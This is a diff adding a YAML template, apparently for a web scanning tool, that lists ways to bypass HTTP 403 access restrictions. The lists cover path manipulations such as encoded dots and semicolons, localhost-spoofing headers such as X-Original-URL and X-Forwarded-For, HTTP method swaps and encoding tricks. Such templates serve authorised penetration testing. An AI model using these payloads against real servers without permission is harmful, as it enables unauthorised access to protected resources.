@@ -1,0 +1,52 @@
+id: bypass_403
+name: 403 Forbidden Bypass
+
+techniques:
+  path_manipulation:
+    - "/{PATH}"
+    - "/%2e/{PATH}"
+    - "/{PATH}/."
+    - "//{PATH}//"
+    - "/./{PATH}/./"
+    - "/{PATH}..;/"
+    - "/{PATH};/"
+    - "/{PATH}...;/"
+    - "/{PATH}%20"
+    - "/{PATH}%09"
+    - "/{PATH}?"
+    - "/{PATH}.html"
+    - "/{PATH}/*"
+    - "/{PATH}.php"
+    - "/{PATH}.json"
+
+  header_overrides:
+    - header: "X-Original-URL"
+      value: "/{PATH}"
+    - header: "X-Rewrite-URL"
+      value: "/{PATH}"
+    - header: "X-Forwarded-For"
+      value: "127.0.0.1"
+    - header: "X-Custom-IP-Authorization"
+      value: "127.0.0.1"
+    - header: "X-Remote-IP"
+      value: "127.0.0.1"
+    - header: "X-Client-IP"
+      value: "127.0.0.1"
+    - header: "X-Host"
+      value: "127.0.0.1"
+    - header: "X-Forwarded-Host"
+      value: "127.0.0.1"
+
+  method_swap:
+    - POST
+    - PUT
+    - PATCH
+    - DELETE
+    - OPTIONS
+    - TRACE
+
+  encoding:
+    - url_encode
+    - double_encode
+    - unicode
+    - overlong_utf8
